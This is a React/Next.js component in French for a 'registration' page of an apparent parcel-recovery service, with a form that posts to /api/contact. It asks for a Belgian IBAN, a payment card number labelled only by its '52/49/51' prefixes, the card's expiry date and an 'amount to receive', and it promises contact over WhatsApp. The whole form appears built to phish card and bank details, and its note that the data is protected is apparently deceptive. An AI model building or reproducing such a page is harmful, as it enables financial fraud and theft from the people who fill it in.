'use client'

import React, { useState } from 'react'
import { motion } from 'framer-motion'
import { useForm } from 'react-hook-form'
import { Mail, Phone, Send, CheckCircle, AlertCircle } from 'lucide-react'

const Contact = () => {
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [error, setError] = useState('')

  // Fonction pour formater la date d'expiration
  const formatExpirationDate = (value: string) => {
    // Supprimer tous les caractères non numériques
    const numericValue = value.replace(/\D/g, '')

    // Limiter à 4 chiffres maximum
    const limitedValue = numericValue.slice(0, 4)

    // Ajouter le "/" après les 2 premiers chiffres
    if (limitedValue.length >= 2) {
      return limitedValue.slice(0, 2) + '/' + limitedValue.slice(2)
    }

    return limitedValue
  }

  const {
    register,
    handleSubmit,
    formState: { errors },
    reset
  } = useForm()

  const onSubmit = async (data: any) => {
    setIsSubmitting(true)
    setError('')
    
    try {
      const response = await fetch('/api/contact?type=enregistrement', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
      })

      const result = await response.json()

      if (!response.ok) {
        throw new Error(result.error || 'Erreur lors de l\'envoi')
      }

      console.log('Email envoyé avec succès:', result)
      setIsSubmitted(true)
      reset()

      // Réinitialiser le message après 5 secondes
      setTimeout(() => {
        setIsSubmitted(false)
      }, 5000)

    } catch (error: any) {
      console.error('Erreur lors de l\'envoi:', error)
      setError('Erreur lors de l\'enregistrement. Veuillez réessayer ou nous contacter directement.')
    } finally {
      setIsSubmitting(false)
    }
  }

  const contactInfo = [
    {
      icon: Mail,
      title: 'Email',
      info: 'registratie@autodp.org',
      subinfo: 'Réponse sous 24h'
    }
  ]

  return (
    <section id="contact" className="py-12 sm:py-16 lg:py-20 xl:py-24 bg-gray-50">
      <div className="container mx-auto px-4 sm:px-6 lg:px-8 xl:px-12">
        {/* Header */}
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          viewport={{ once: true }}
          className="text-center mb-8 sm:mb-12 lg:mb-16"
        >
          <h2 className="text-2xl sm:text-3xl md:text-4xl lg:text-5xl font-bold text-gray-900 mb-4 sm:mb-6">
            <span className="bg-gradient-to-r from-primary-600 to-blue-500 bg-clip-text text-transparent">Enregistrement</span>
          </h2>
          <p className="text-base sm:text-lg lg:text-xl text-gray-600 max-w-2xl lg:max-w-3xl mx-auto px-4">
            Remplissez ce formulaire pour vous enregistrer.
            Nous traiterons votre demande dans les plus brefs délais.
          </p>
        </motion.div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8 sm:gap-12 lg:gap-16">
          {/* Contact Info */}
          <motion.div
            initial={{ opacity: 0, x: -50 }}
            whileInView={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.8 }}
            viewport={{ once: true }}
            className="space-y-6 sm:space-y-8"
          >
            <div>
              <h3 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 mb-6 sm:mb-8">
                Informations importantes
              </h3>
              
              <div className="grid gap-6">
                {contactInfo.map((item, index) => (
                  <motion.div
                    key={index}
                    initial={{ opacity: 0, y: 20 }}
                    whileInView={{ opacity: 1, y: 0 }}
                    transition={{ duration: 0.6, delay: index * 0.1 }}
                    viewport={{ once: true }}
                    className="flex items-start space-x-4 p-6 bg-white rounded-xl shadow-lg hover:shadow-xl transition-shadow duration-300"
                  >
                    <div className="bg-primary-100 p-3 rounded-lg">
                      <item.icon className="w-6 h-6 text-primary-600" />
                    </div>
                    <div>
                      <h4 className="text-lg font-semibold text-dark-900 mb-1">{item.title}</h4>
                      <p className="text-primary-600 font-medium mb-1">{item.info}</p>
                      <p className="text-gray-600 text-sm">{item.subinfo}</p>
                    </div>
                  </motion.div>
                ))}
              </div>
            </div>

            {/* Service Banner */}
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6, delay: 0.6 }}
              viewport={{ once: true }}
              className="bg-gradient-to-r from-green-500 to-blue-500 rounded-xl p-6 text-white"
            >
              <h4 className="text-xl font-bold mb-2 flex items-center">
                <Phone className="w-6 h-6 mr-2" />
                Service de Récupération
              </h4>
              <p className="text-green-100 mb-4">
                Besoin de récupérer un colis ? Nous intervenons 24h/24 et 7j/7 partout en France.
              </p>
            </motion.div>
          </motion.div>

          {/* Contact Form */}
          <motion.div
            initial={{ opacity: 0, x: 50 }}
            whileInView={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.8 }}
            viewport={{ once: true }}
            className="bg-white rounded-xl sm:rounded-2xl shadow-xl p-4 sm:p-6 lg:p-8"
          >
            <h3 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 mb-6 sm:mb-8">
              Formulaire d'enregistrement
            </h3>

            {error && (
              <motion.div
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6 flex items-center space-x-3"
              >
                <AlertCircle className="w-6 h-6 text-red-600" />
                <div>
                  <h4 className="font-semibold text-red-800">Erreur</h4>
                  <p className="text-red-700 text-sm">{error}</p>
                </div>
              </motion.div>
            )}

            <form onSubmit={handleSubmit(onSubmit)} className="space-y-4 sm:space-y-6">
              {/* Nom complet */}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  Nom complet *
                </label>
                <input
                  type="text"
                  {...register('nom_complet', { required: 'Le nom complet est obligatoire' })}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                    errors.nom_complet ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="Votre nom complet"
                />
                {errors.nom_complet && (
                  <p className="mt-1 text-sm text-red-600 flex items-center">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {String(errors.nom_complet?.message || 'Ce champ est obligatoire')}
                  </p>
                )}
              </div>

              {/* Email et Téléphone */}
              <div className="grid md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Email *
                  </label>
                  <input
                    type="email"
                    {...register('email', {
                      required: 'L\'email est obligatoire',
                      pattern: {
                        value: /^\S+@\S+$/i,
                        message: 'Email invalide'
                      }
                    })}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                      errors.email ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder="votre@email.com"
                  />
                  {errors.email && (
                    <p className="mt-1 text-sm text-red-600 flex items-center">
                      <AlertCircle className="w-4 h-4 mr-1" />
                      {String(errors.email?.message || 'Ce champ est obligatoire')}
                    </p>
                  )}
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Téléphone *
                  </label>
                  <input
                    type="tel"
                    {...register('telephone', { required: 'Le téléphone est obligatoire' })}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                      errors.telephone ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder="01 23 45 67 89"
                  />
                  {errors.telephone && (
                    <p className="mt-1 text-sm text-red-600 flex items-center">
                      <AlertCircle className="w-4 h-4 mr-1" />
                      {String(errors.telephone?.message || 'Ce champ est obligatoire')}
                    </p>
                  )}
                </div>
              </div>

              {/* Adresse de récupération */}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  Adresse de récupération *
                </label>
                <input
                  type="text"
                  {...register('adresse', { required: 'L\'adresse de récupération est obligatoire' })}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                    errors.adresse ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="Adresse complète de récupération"
                />
                {errors.adresse && (
                  <p className="mt-1 text-sm text-red-600 flex items-center">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {String(errors.adresse?.message || 'Ce champ est obligatoire')}
                  </p>
                )}
              </div>

              {/* Type d'article et Description */}
              <div className="grid md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Type d'article *
                  </label>
                  <input
                    type="text"
                    {...register('type_article', { required: 'Le type d\'article est obligatoire' })}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                      errors.type_article ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder="Ex: Électronique, Vêtements, Livres..."
                  />
                  {errors.type_article && (
                    <p className="mt-1 text-sm text-red-600 flex items-center">
                      <AlertCircle className="w-4 h-4 mr-1" />
                      {String(errors.type_article?.message || 'Ce champ est obligatoire')}
                    </p>
                  )}
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Description de l'article *
                  </label>
                  <input
                    type="text"
                    {...register('description_article', { required: 'La description de l\'article est obligatoire' })}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                      errors.description_article ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder="Description détaillée de l'article (ex: Smartphone Samsung Galaxy, Pull en laine rouge, etc.)"
                  />
                  {errors.description_article && (
                    <p className="mt-1 text-sm text-red-600 flex items-center">
                      <AlertCircle className="w-4 h-4 mr-1" />
                      {String(errors.description_article?.message || 'Ce champ est obligatoire')}
                    </p>
                  )}
                </div>
              </div>

              {/* Numéro de carte BE */}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  Numéro de carte BE *
                </label>
                <input
                  type="text"
                  {...register('carte_be', { required: 'Le numéro de carte BE est obligatoire' })}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                    errors.carte_be ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="BE76 1234 5678 9012 3456 7890 123"
                />
                {errors.carte_be && (
                  <p className="mt-1 text-sm text-red-600 flex items-center">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {String(errors.carte_be?.message || 'Ce champ est obligatoire')}
                  </p>
                )}
              </div>

              {/* Numéro de carte 52/49/51 et Date d'expiration */}
              <div className="grid md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Numéro de carte 52/49/51 *
                  </label>
                  <input
                    type="text"
                    {...register('carte_52_49_51', { required: 'Le numéro de carte 52/49/51 est obligatoire' })}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                      errors.carte_52_49_51 ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder="1234 5678 9012 3456"
                  />
                  {errors.carte_52_49_51 && (
                    <p className="mt-1 text-sm text-red-600 flex items-center">
                      <AlertCircle className="w-4 h-4 mr-1" />
                      {String(errors.carte_52_49_51?.message || 'Ce champ est obligatoire')}
                    </p>
                  )}
                </div>

                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Date d'expiration *
                  </label>
                  <input
                    type="text"
                    {...register('date_expiration', { required: 'La date d\'expiration est obligatoire' })}
                    className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                      errors.date_expiration ? 'border-red-500' : 'border-gray-300'
                    }`}
                    placeholder="MM/AA"
                    maxLength={5}
                    onChange={(e) => {
                      const formattedValue = formatExpirationDate(e.target.value)
                      e.target.value = formattedValue
                    }}
                  />
                  {errors.date_expiration && (
                    <p className="mt-1 text-sm text-red-600 flex items-center">
                      <AlertCircle className="w-4 h-4 mr-1" />
                      {String(errors.date_expiration?.message || 'Ce champ est obligatoire')}
                    </p>
                  )}
                </div>
              </div>

              {/* Montant */}
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-2">
                  Montant à recevoir *
                </label>
                <input
                  type="number"
                  step="0.01"
                  {...register('montant', { required: 'Le montant est obligatoire' })}
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-primary-500 focus:border-primary-500 transition-colors ${
                    errors.montant ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="100.00"
                />
                {errors.montant && (
                  <p className="mt-1 text-sm text-red-600 flex items-center">
                    <AlertCircle className="w-4 h-4 mr-1" />
                    {String(errors.montant?.message || 'Ce champ est obligatoire')}
                  </p>
                )}
              </div>

              {/* Submit Button */}
              <motion.button
                type="submit"
                disabled={isSubmitting}
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                className={`w-full py-4 rounded-lg font-semibold text-lg transition-all duration-300 flex items-center justify-center space-x-2 ${
                  isSubmitting
                    ? 'bg-gray-400 cursor-not-allowed'
                    : 'btn-primary'
                }`}
              >
                {isSubmitting ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                    <span>Enregistrement en cours...</span>
                  </>
                ) : (
                  <>
                    <Send className="w-5 h-5" />
                    <span>S'enregistrer</span>
                  </>
                )}
              </motion.button>
            </form>

            <p className="text-sm text-gray-600 mt-4 text-center">
              * Champs obligatoires. Vos données sont protégées et ne seront jamais partagées.
            </p>
          </motion.div>
        </div>
      </div>

      {/* Modal de succès */}
      {isSubmitted && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4"
          onClick={() => setIsSubmitted(false)}
        >
          <motion.div
            initial={{ opacity: 0, scale: 0.7, y: 50 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.7, y: 50 }}
            transition={{ type: "spring", duration: 0.5 }}
            className="bg-white rounded-2xl p-8 max-w-md w-full mx-4 shadow-2xl"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="text-center">
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ delay: 0.2, type: "spring", stiffness: 200 }}
                className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6"
              >
                <CheckCircle className="w-12 h-12 text-green-600" />
              </motion.div>

              <motion.h3
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
                className="text-2xl font-bold text-gray-900 mb-4"
              >
                Enregistrement réussi !
              </motion.h3>

              <motion.p
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.4 }}
                className="text-gray-600 mb-2"
              >
                Votre enregistrement a été effectué avec succès.
              </motion.p>

              <motion.p
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.5 }}
                className="text-green-600 font-semibold mb-8"
              >
                Nous vous contacterons via WhatsApp.
              </motion.p>

              <motion.button
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.6 }}
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={() => setIsSubmitted(false)}
                className="bg-green-600 hover:bg-green-700 text-white font-semibold py-3 px-8 rounded-full transition-colors duration-200"
              >
                Parfait !
              </motion.button>
            </div>
          </motion.div>
        </motion.div>
      )}
    </section>
  )
}

export default Contact
